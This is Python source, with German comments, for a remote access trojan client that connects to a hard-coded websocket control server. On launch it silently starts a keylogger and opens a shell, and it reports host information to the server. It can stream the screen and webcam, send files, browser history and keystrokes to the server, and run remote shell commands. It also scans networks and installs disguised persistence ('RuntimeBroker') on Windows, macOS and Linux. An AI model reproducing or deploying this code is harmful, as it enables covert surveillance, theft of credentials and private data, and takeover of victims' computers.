import asyncio
import websockets
import json
import subprocess
import os
import base64
import mss
import mss.tools
from PIL import Image
import io
import platform
import shutil
import sys
import socket
import urllib.request
import logging
import secrets
import time
from datetime import datetime
import browserhistory as bh
import psutil
import pygetwindow as gw
import pyautogui

# --- Konfiguration & Globals ---
SERVER_URI = os.getenv("SERVER_URI", "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app/rat")
KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")
HEARTBEAT_INTERVAL = 45  # Sekunden
PERSISTENCE_NAME = "RuntimeBroker"  # Name für den Registry-Eintrag/Task

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# --- Optionales Modul: Keylogger ---
try:
    from pynput import keyboard
except ImportError:
    logging.warning("pynput ist nicht installiert. Keylogger-Funktion ist deaktiviert.")
    keyboard = None

# === Hilfsfunktionen: System & Netzwerk ===
def get_public_ip() -> str:
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
            return resp.read().decode('utf8')
    except Exception as e:
        logging.warning(f"Fehler beim Abrufen der öffentlichen IP: {e}")
        return "Unbekannt"

def get_initial_info() -> dict:
    """Sammelt alle initialen Systeminformationen in einem strukturierten Format."""
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"
        
    return {
        "type": "info",
        "data": {
            "user": user,
            "hostname": socket.gethostname(),
            "os": platform.platform(),
            "ip": get_public_ip(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "cwd": os.getcwd(),
        }
    }

def get_detailed_system_info() -> str:
    """Sammelt detaillierte Systeminformationen für den 'systeminfo'-Befehl."""
    try:
        info = get_initial_info()["data"]
        # Füge zusätzliche Details hinzu
        info["Lokale IPs"] = ", ".join(socket.gethostbyname_ex(info["hostname"])[2])
        info["CPU"] = platform.processor()
        
        if hasattr(os, 'sysconf'):
            ram_mb = round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**2), 2)
            info["Arbeitsspeicher (MB)"] = ram_mb
        
        free_space = shutil.disk_usage('.').free / (1024 * 1024)
        info["Freier Speicherplatz (MB)"] = round(free_space, 2)
        
        return "\n".join(f"{k.replace('_', ' ').title()}: {v}" for k, v in info.items())
    except Exception as e:
        return f"Fehler beim Abrufen der Systeminformationen: {e}"

def get_network_info() -> str:
    """Sammelt detaillierte Netzwerkinformationen."""
    try:
        info = {"Öffentliche IP": get_public_ip()}
        
        # Hostname und lokale IPs
        hostname = socket.gethostname()
        info["Hostname"] = hostname
        try:
            info["Lokale IPs"] = ", ".join(socket.gethostbyname_ex(hostname)[2])
        except socket.gaierror:
            info["Lokale IPs"] = "Nicht gefunden"

        # Netzwerk-Interfaces und Verbindungen
        if_addrs = psutil.net_if_addrs()
        interfaces = []
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                if str(address.family) == 'AddressFamily.AF_INET':
                    interfaces.append(f"  - {interface_name}: IP {address.address}, Maske {address.netmask}")
        info["Netzwerk-Interfaces"] = "\n" + "\n".join(interfaces) if interfaces else "Keine gefunden"

        connections = psutil.net_connections(kind='inet')
        info["Aktive TCP-Verbindungen"] = len(connections)

        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"Fehler beim Abrufen der Netzwerkinformationen: {e}"

def get_history() -> str:
    """Ruft den Browserverlauf ab."""
    try:
        history = bh.get_browserhistory()
        output = ["Browserverlauf:"]
        # Nehmen wir die letzten 20 Einträge von jedem Browser
        for browser, entries in history.items():
            output.append(f"\n--- {browser.title()} ---")
            if entries:
                for url, title, timestamp in entries[-20:]:
                    output.append(f"[{timestamp}] {title}\n  {url}")
            else:
                output.append("Kein Verlauf gefunden.")
        return "\n".join(output)
    except Exception as e:
        return f"Fehler beim Abrufen des Verlaufs: {e}"

async def scan_network(cidr_range: str) -> str:
    """Scant das Netzwerk nach aktiven Hosts."""
    try:
        import ipaddress
        net = ipaddress.ip_network(cidr_range, strict=False)
        tasks = []
        active_hosts = []

        # Ping-Befehl je nach Betriebssystem anpassen
        ping_cmd = "ping -n 1 -w 500" if platform.system() == "Windows" else "ping -c 1 -W 0.5"

        async def ping_host(ip):
            proc = await asyncio.create_subprocess_shell(
                f"{ping_cmd} {ip}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()
            if proc.returncode == 0:
                active_hosts.append(str(ip))

        for ip in net.hosts():
            tasks.append(ping_host(str(ip)))
        
        await asyncio.gather(*tasks, return_exceptions=True)

        if not active_hosts:
            return f"Keine aktiven Hosts im Bereich {cidr_range} gefunden."
        
        return f"Aktive Hosts in {cidr_range}:\n" + "\n".join(sorted(active_hosts))

    except ImportError:
        return "Fehler: 'ipaddress'-Modul nicht gefunden."
    except ValueError:
        return f"Fehler: Ungültiger CIDR-Bereich '{cidr_range}'."
    except Exception as e:
        return f"Fehler beim Netzwerk-Scan: {e}"

def get_process_list() -> str:
    """Listet laufende Prozesse auf."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'username', 'cpu_percent', 'memory_info'])
                pinfo['memory_mb'] = round(pinfo['memory_info'].rss / (1024 * 1024), 2)
                processes.append(pinfo)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        # Sortieren nach CPU-Auslastung
        processes.sort(key=lambda p: p['cpu_percent'], reverse=True)
        
        output = ["PID\tCPU(%)\tMEM(MB)\tUsername\tName"]
        for p in processes[:50]: # Die Top 50 anzeigen
            output.append(f"{p['pid']}\t{p['cpu_percent']:.2f}\t{p['memory_mb']:.2f}\t{p.get('username', 'N/A')}\t{p['name']}")
        return "\n".join(output)
    except Exception as e:
        return f"Fehler beim Auflisten der Prozesse: {e}"

def kill_process(pid: str) -> str:
    """Beendet einen Prozess anhand seiner PID."""
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process.terminate()
        return f"Prozess {pid} ({process.name()}) wurde beendet."
    except ValueError:
        return "Fehler: Ungültige PID."
    except psutil.NoSuchProcess:
        return f"Fehler: Prozess mit PID {pid} nicht gefunden."
    except psutil.AccessDenied:
        return f"Fehler: Zugriff verweigert, um Prozess {pid} zu beenden."
    except Exception as e:
        return f"Fehler beim Beenden des Prozesses: {e}"

def show_message_box(text: str) -> str:
    """Zeigt eine Nachrichtenbox auf dem Client an."""
    try:
        pyautogui.alert(text=text, title="Nachricht vom Server")
        return "Nachrichtenbox angezeigt."
    except Exception as e:
        return f"Fehler beim Anzeigen der Nachrichtenbox: {e}"

# === Persistence & Uninstallation ===
def _get_script_path():
    """Determines the path of the script, handling frozen executables."""
    if getattr(sys, 'frozen', False):
        # The application is frozen
        return sys.executable
    else:
        # The application is not frozen
        # Return the real path of the script
        return os.path.realpath(__file__)

def _manage_persistence_windows(enable=True) -> str:
    """Manages persistence on Windows using the Registry."""
    try:
        # In Windows, sys.executable is the path to the python.exe or the frozen .exe
        exe_path = sys.executable
        dest_folder = os.path.join(os.environ["APPDATA"], PERSISTENCE_NAME)
        dest_path = os.path.join(dest_folder, f"{PERSISTENCE_NAME}.exe")
        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        if enable:
            os.makedirs(dest_folder, exist_ok=True)
            # Only copy if the script is not already in the destination
            if os.path.realpath(exe_path).lower() != os.path.realpath(dest_path).lower():
                shutil.copyfile(exe_path, dest_path)
            
            cmd = f'reg add HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /t REG_SZ /d "{dest_path}" /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            return f"Persistence enabled. Client will start on next login from '{dest_path}'."
        else:
            cmd = f'reg delete HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /f'
            # Run and ignore errors if the key doesn't exist
            subprocess.run(cmd, shell=True, check=False, capture_output=True, text=True)
            if os.path.exists(dest_path):
                try:
                    # Attempt to kill process before deleting
                    subprocess.run(f"taskkill /f /im {os.path.basename(dest_path)}", shell=True, check=False, capture_output=True)
                    os.remove(dest_path)
                    os.rmdir(dest_folder)
                except OSError as e:
                    return f"Persistence registry entry removed, but could not delete file '{dest_path}': {e}"
            return "Persistence successfully removed."
    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
        return f"Error managing Windows persistence: {e.stderr if hasattr(e, 'stderr') else e}"
    except Exception as e:
        return f"An unexpected error occurred during Windows persistence: {e}"

def _manage_persistence_macos(enable=True) -> str:
    """Manages persistence on macOS using LaunchAgents."""
    try:
        script_path = _get_script_path()
        plist_name = f"com.{PERSISTENCE_NAME.lower()}.plist"
        plist_dir = os.path.join(os.path.expanduser("~"), "Library", "LaunchAgents")
        plist_path = os.path.join(plist_dir, plist_name)
        
        dest_dir = os.path.join(os.path.expanduser("~"), f".{PERSISTENCE_NAME}")
        dest_path = os.path.join(dest_dir, os.path.basename(script_path) if not getattr(sys, 'frozen', False) else PERSISTENCE_NAME)

        if enable:
            os.makedirs(dest_dir, exist_ok=True)
            if os.path.realpath(script_path).lower() != os.path.realpath(dest_path).lower():
                shutil.copy(script_path, dest_path)
            os.chmod(dest_path, 0o755)

            plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{plist_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{dest_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            os.makedirs(plist_dir, exist_ok=True)
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            subprocess.run(["launchctl", "load", plist_path], check=True, capture_output=True, text=True)
            return f"Persistence enabled via LaunchAgent: {plist_path}"
        else:
            if os.path.exists(plist_path):
                subprocess.run(["launchctl", "unload", plist_path], check=False, capture_output=True, text=True)
                os.remove(plist_path)
            if os.path.exists(dest_path):
                shutil.rmtree(dest_dir, ignore_errors=True)
            return "Persistence successfully removed."
    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
        return f"Error managing macOS persistence: {e.stderr if hasattr(e, 'stderr') else e}"
    except Exception as e:
        return f"An unexpected error occurred during macOS persistence: {e}"

def _manage_persistence_linux_autostart(enable=True) -> str:
    """Manages persistence on Linux using XDG Autostart (for desktop environments)."""
    try:
        script_path = _get_script_path()
        autostart_dir = os.path.join(os.path.expanduser("~"), ".config", "autostart")
        desktop_file_path = os.path.join(autostart_dir, f"{PERSISTENCE_NAME.lower()}.desktop")

        dest_dir = os.path.join(os.path.expanduser("~"), f".{PERSISTENCE_NAME}")
        dest_path = os.path.join(dest_dir, os.path.basename(script_path) if not getattr(sys, 'frozen', False) else PERSISTENCE_NAME)

        if enable:
            os.makedirs(dest_dir, exist_ok=True)
            if os.path.realpath(script_path).lower() != os.path.realpath(dest_path).lower():
                shutil.copy(script_path, dest_path)
            os.chmod(dest_path, 0o755)

            desktop_entry = f"""
[Desktop Entry]
Type=Application
Name={PERSISTENCE_NAME}
Exec=env python3 "{dest_path}"
StartupNotify=false
Terminal=false
"""
            os.makedirs(autostart_dir, exist_ok=True)
            with open(desktop_file_path, "w") as f:
                f.write(desktop_entry)
            return f"Persistence enabled via Autostart: {desktop_file_path}"
        else:
            if os.path.exists(desktop_file_path):
                os.remove(desktop_file_path)
            if os.path.exists(dest_dir):
                shutil.rmtree(dest_dir, ignore_errors=True)
            return "Persistence successfully removed."
    except (FileNotFoundError, PermissionError) as e:
        return f"Error managing Linux autostart persistence: {e}"
    except Exception as e:
        return f"An unexpected error occurred during Linux autostart persistence: {e}"

def manage_persistence(enable=True) -> str:
    """Manages client persistence across Windows, macOS, and Linux."""
    system = platform.system()
    if system == "Windows":
        return _manage_persistence_windows(enable)
    elif system == "Darwin":
        return _manage_persistence_macos(enable)
    elif system == "Linux":
        # Simple check for desktop environment.
        if os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"):
             return _manage_persistence_linux_autostart(enable)
        else:
             return "Linux persistence is only supported in desktop environments (via .desktop files)."
    else:
        return f"Persistence is not supported on this OS: {system}."

def uninstall_client() -> str:
    """Removes persistence and schedules the client for self-deletion."""
    try:
        # 1. Remove persistence across all platforms
        persistence_msg = manage_persistence(enable=False)
        
        # 2. Self-deletion logic
        client_path = _get_script_path()
        
        if platform.system() == "Windows":
            # Use a batch script for deletion
            batch_content = f"""
@echo off
echo "Uninstalling RAT client..."
timeout /t 3 /nobreak > NUL
taskkill /f /im "{os.path.basename(client_path)}" > NUL
del "{client_path}"
del "%~f0"
"""
            batch_path = os.path.join(os.environ["TEMP"], "uninstall.bat")
            with open(batch_path, "w") as f:
                f.write(batch_content)
            
            subprocess.Popen(f'"{batch_path}"', shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
            
        else: # Linux and macOS
            # Use a shell script for deletion
            script_content = f"""
#!/bin/sh
echo "Uninstalling RAT client..."
sleep 3
kill -9 {os.getpid()}
rm -f "{client_path}"
rm -- "$0"
"""
            script_path = os.path.join(os.path.expanduser("~"), ".uninstall.sh")
            with open(script_path, "w") as f:
                f.write(script_content)
            
            os.chmod(script_path, 0o755)
            subprocess.Popen([script_path], shell=True)

        return f"{persistence_msg}\nUninstallation process started. The client will be terminated and deleted shortly."

    except Exception as e:
        return f"Error during uninstallation: {e}"


# === Datei- und Verzeichnisfunktionen ===
def list_directory(path=".") -> str:
    try:
        entries = os.listdir(path)
        output = [f"Inhalt von {os.path.abspath(path)}:"]
        for entry in sorted(entries):
            full_path = os.path.join(path, entry)
            prefix = "[DIR] " if os.path.isdir(full_path) else "      "
            output.append(f"{prefix} {entry}")
        return "\n".join(output)
    except Exception as e:
        return f"Fehler beim Auflisten des Verzeichnisses: {e}"

def change_directory(path: str) -> str:
    try:
        os.chdir(path)
        with open(CD_STATE_FILE, "w", encoding="utf-8") as f:
            f.write(os.getcwd())
        return f"Verzeichnis gewechselt zu: {os.getcwd()}"
    except Exception as e:
        return f"Fehler beim Wechseln des Verzeichnisses: {e}"

def remove_path(path: str) -> str:
    """Löscht eine Datei oder ein Verzeichnis."""
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"Datei '{path}' gelöscht."
        elif os.path.isdir(path):
            shutil.rmtree(path)
            return f"Verzeichnis '{path}' und sein Inhalt gelöscht."
        else:
            return f"Fehler: Pfad '{path}' nicht gefunden."
    except Exception as e:
        return f"Fehler beim Löschen von '{path}': {e}"

def make_directory(path: str) -> str:
    """Erstellt ein neues Verzeichnis."""
    try:
        os.makedirs(path, exist_ok=True)
        return f"Verzeichnis '{path}' erstellt."
    except Exception as e:
        return f"Fehler beim Erstellen von '{path}': {e}"

def load_cwd_state():
    """Lädt das letzte Arbeitsverzeichnis beim Start."""
    try:
        if os.path.exists(CD_STATE_FILE):
            with open(CD_STATE_FILE, "r", encoding="utf-8") as f:
                path = f.read().strip()
            if os.path.isdir(path):
                os.chdir(path)
    except Exception as e:
        logging.warning(f"Konnte Arbeitsverzeichnis nicht wiederherstellen: {e}")

# === Keylogger ===
def on_press_persistent(key):
    if not keyboard: return
    
    special_key_map = { keyboard.Key.enter: "\n", keyboard.Key.space: " ", keyboard.Key.backspace: "[BS]" }
    log_entry = special_key_map.get(key)
    if log_entry is None:
        try: log_entry = key.char
        except AttributeError: log_entry = f"[{key.name}]"

    if log_entry:
        try:
            with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f: f.write(log_entry)
        except Exception: pass

def start_persistent_keylogger():
    if not keyboard: return
    header = f"\n--- SESSION GESTARTET: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    try:
        with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f: f.write(header)
        listener = keyboard.Listener(on_press=on_press_persistent)
        listener.daemon = True
        listener.start()
        logging.info(f"Persistenter Keylogger gestartet. Log: {KEYLOG_FILE_PATH}")
    except Exception as e:
        logging.error(f"Fehler beim Starten des Keyloggers: {e}")

# === Screen Streaming ===
class ScreenStreamer:
    def __init__(self):
        self._task = None
        self._running = False
        self._ws = None

    async def start(self, ws):
        if self._running: return
        self._running = True
        self._ws = ws
        self._task = asyncio.create_task(self._stream())
        logging.info("Screen-Streaming gestartet.")

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            self._task = None
        logging.info("Screen-Streaming gestoppt.")

    async def _stream(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while self._running:
                try:
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    img.thumbnail((1280, 720), Image.LANCZOS)
                    
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=75)
                    img_base64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                    
                    await self._ws.send(json.dumps({"type": "screen_frame", "data": img_base64}))
                    await asyncio.sleep(0.1)
                except (websockets.ConnectionClosed, asyncio.CancelledError): break
                except Exception as e:
                    logging.error(f"Fehler im Screen-Stream: {e}")
                    break
        logging.info("Screen-Stream-Schleife beendet.")

screen_streamer = ScreenStreamer()

# === Webcam Streaming ===
class WebcamStreamer:
    def __init__(self):
        self._task = None
        self._running = False
        self._ws = None
        self._cap = None

    async def start(self, ws, cam_index=0):
        if self._running: return
        
        try:
            # Dynamischer Import von OpenCV
            global cv2
            import cv2
        except ImportError:
            logging.error("OpenCV ist nicht installiert. Webcam-Funktion ist deaktiviert.")
            await ws.send(json.dumps({"type": "command_output", "output": "Fehler: OpenCV nicht auf dem Client installiert."}))
            return

        self._running = True
        self._ws = ws
        self._task = asyncio.create_task(self._stream(cam_index))
        logging.info(f"Webcam-Streaming von Kamera {cam_index} gestartet.")

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            self._task = None
        if self._cap:
            self._cap.release()
            self._cap = None
        logging.info("Webcam-Streaming gestoppt.")

    async def _stream(self, cam_index):
        self._cap = cv2.VideoCapture(cam_index)
        if not self._cap.isOpened():
            logging.error(f"Konnte Webcam {cam_index} nicht öffnen.")
            await self._ws.send(json.dumps({"type": "command_output", "output": f"Fehler: Webcam {cam_index} konnte nicht geöffnet werden."}))
            self._running = False
            return

        while self._running:
            try:
                ret, frame = self._cap.read()
                if not ret: break

                # Bild für die Übertragung optimieren
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame_rgb)
                img.thumbnail((640, 480), Image.LANCZOS)
                
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=70)
                img_base64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                
                await self._ws.send(json.dumps({"type": "webcam_frame", "data": img_base64}))
                await asyncio.sleep(0.05) # ~20 FPS
            except (websockets.ConnectionClosed, asyncio.CancelledError):
                break
            except Exception as e:
                logging.error(f"Fehler im Webcam-Stream: {e}")
                break
        
        if self._cap: self._cap.release()
        logging.info("Webcam-Stream-Schleife beendet.")

webcam_streamer = WebcamStreamer()

def list_webcams() -> str:
    """Listet verfügbare Webcams auf."""
    try:
        global cv2
        import cv2
    except ImportError:
        return "Fehler: OpenCV ist auf dem Client nicht installiert."

    try:
        cams = []
        for i in range(10): # Prüfe die ersten 10 Indizes
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cams.append(f"Kamera {i}: Verfügbar")
                cap.release()
            else:
                cams.append(f"Kamera {i}: Nicht verfügbar oder Ende der Liste")
                break
        return "\n".join(cams)
    except Exception as e:
        return f"Fehler beim Auflisten der Webcams: {e}"

# === Interaktive Shell ===
class InteractiveShell:
    def __init__(self):
        self._process = None
        self._running = False

    async def start(self):
        if self._running:
            return "Shell läuft bereits."
        
        self._running = True
        shell_cmd = 'cmd.exe' if platform.system() == "Windows" else '/bin/bash'
        
        self._process = await asyncio.create_subprocess_shell(
            shell_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.getcwd() # Start im aktuellen Verzeichnis
        )
        return f"Interaktive Shell gestartet (PID: {self._process.pid})."

    async def execute(self, command: str) -> str:
        if not self._running or not self._process:
            return "Fehler: Shell läuft nicht."
        
        try:
            # Befehl an die Shell senden
            self._process.stdin.write(f"{command}\n".encode())
            await self._process.stdin.drain()
            
            # Warte auf eine kurze Zeit, um die Ausgabe zu sammeln
            await asyncio.sleep(0.5)
            
            # Lese die Ausgabe ohne zu blockieren
            output = ""
            while True:
                try:
                    line = await asyncio.wait_for(self._process.stdout.readline(), timeout=0.1)
                    if not line: break
                    output += line.decode(errors='ignore')
                except asyncio.TimeoutError:
                    break
            
            # Lese auch stderr
            stderr_output = ""
            while True:
                try:
                    line = await asyncio.wait_for(self._process.stderr.readline(), timeout=0.1)
                    if not line: break
                    stderr_output += line.decode(errors='ignore')
                except asyncio.TimeoutError:
                    break

            return output + stderr_output if output or stderr_output else "Befehl ausgeführt."

        except Exception as e:
            return f"Fehler bei der Shell-Ausführung: {e}"

    def stop(self):
        if self._process:
            self._process.terminate()
        self._running = False
        return "Shell beendet."

interactive_shell = InteractiveShell()

# === Hauptlogik: Befehlsverarbeitung ===
async def process_commands(websocket: websockets.ClientConnection):
    async for message in websocket:
        try:
            if isinstance(message, bytes): continue

            command = json.loads(message)
            action = command.get("action")
            response = {"type": "command_output", "status": "ok"}
            output = None

            if action == "exec":
                output = await interactive_shell.execute(command.get("command"))
            elif action == "screenshot":
                with mss.mss() as sct:
                    sct_img = sct.grab(sct.monitors[1])
                    img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                response = {"type": "screenshot", "data": base64.b64encode(img_bytes).decode("utf-8")}
            elif action == "download":
                path = command.get("path")
                if os.path.isfile(path):
                    with open(path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    response = {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
                else: output = "Fehler: Datei nicht gefunden."
            elif action == "upload":
                with open(command.get("filename"), "wb") as f:
                    f.write(base64.b64decode(command.get("data")))
                output = f"Datei gespeichert: {command.get('filename')}"
            elif action == "ls": output = list_directory(command.get("path", "."))
            elif action == "cd": output = change_directory(command.get("path", "."))
            elif action == "rm": output = remove_path(command.get("path"))
            elif action == "mkdir": output = make_directory(command.get("path"))
            elif action == "systeminfo": output = get_detailed_system_info()
            elif action == "network_info": output = get_network_info()
            elif action == "history": output = get_history()
            elif action == "ps": output = get_process_list()
            elif action == "kill": output = kill_process(command.get("pid"))
            elif action == "msgbox": output = show_message_box(command.get("text"))
            elif action == "network_scan":
                output = await scan_network(command.get("range", "192.168.1.0/24"))
            elif action == "webcam_list":
                output = list_webcams()
            elif action == "persist":
                output = manage_persistence(enable=True)
            elif action == "unpersist":
                output = manage_persistence(enable=False)
            elif action == "uninstall":
                output = uninstall_client()
                await websocket.send(json.dumps({"type": "command_output", "output": output}))
                await websocket.close()
                sys.exit(0) # Beendet den Client-Prozess
            elif action == "shell":
                cmd_to_run = command.get("command")
                if cmd_to_run == "start":
                    output = await interactive_shell.start()
                elif cmd_to_run == "stop":
                    output = interactive_shell.stop()
                else:
                    output = await interactive_shell.execute(cmd_to_run)
            elif action == "keylogger":
                if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                    output = "Keylogger nicht verfügbar oder keine Daten."
                else:
                    with open(KEYLOG_FILE_PATH, "rb") as f:
                        f.seek(0, os.SEEK_END)
                        filesize = f.tell()
                        count = command.get("count", 1000)
                        f.seek(max(0, filesize - count))
                        output = f.read().decode("utf-8", errors="ignore")
            elif action == "screenstream_start":
                await screen_streamer.start(websocket)
                output = "Screen-Streaming gestartet."
            elif action == "screenstream_stop":
                await screen_streamer.stop()
                output = "Screen-Streaming gestoppt."
            elif action == "webcam_start":
                cam_index = int(command.get("index", 0))
                await webcam_streamer.start(websocket, cam_index)
                output = f"Webcam-Streaming wird von Kamera {cam_index} gestartet..."
            elif action == "webcam_stop":
                await webcam_streamer.stop()
                output = "Webcam-Streaming gestoppt."
            else: output = f"Unbekannte Aktion: {action}"

            if output: response["output"] = output
            await websocket.send(json.dumps(response))
        except Exception as e:
            logging.error(f"Fehler bei Befehlsverarbeitung: {e}")

# --- Heartbeat & Hauptverbindung ---
async def heartbeat(ws: websockets.ClientConnection):
    while True:
        try:
            await ws.send(json.dumps({"type": "ping"}))
            await asyncio.sleep(HEARTBEAT_INTERVAL)
        except websockets.ConnectionClosed:
            break

async def connect_to_server():
    load_cwd_state()
    start_persistent_keylogger()
    
    # Starte die interaktive Shell beim Client-Start
    await interactive_shell.start()
    
    backoff_time = 5
    while True:
        try:
            async with websockets.connect(SERVER_URI) as websocket:
                logging.info(f"Verbunden mit Server: {SERVER_URI}")
                backoff_time = 5

                await websocket.send(json.dumps(get_initial_info()))

                heartbeat_task = asyncio.create_task(heartbeat(websocket))
                commands_task = asyncio.create_task(process_commands(websocket))
                
                done, pending = await asyncio.wait([heartbeat_task, commands_task], return_when=asyncio.FIRST_COMPLETED)
                for task in pending: task.cancel()

        except (websockets.ConnectionClosed, ConnectionRefusedError, socket.gaierror) as e:
            logging.warning(f"Verbindung verloren ({type(e).__name__}). Nächster Versuch in {backoff_time}s.")
        except Exception as e:
            logging.error(f"Unerwarteter Fehler: {e}")
        
        await asyncio.sleep(backoff_time)
        backoff_time = min(backoff_time * 2, 300)

if __name__ == "__main__":
    try:
        asyncio.run(connect_to_server())
    except KeyboardInterrupt:
        logging.info("Client manuell beendet.")
    finally:
        interactive_shell.stop()
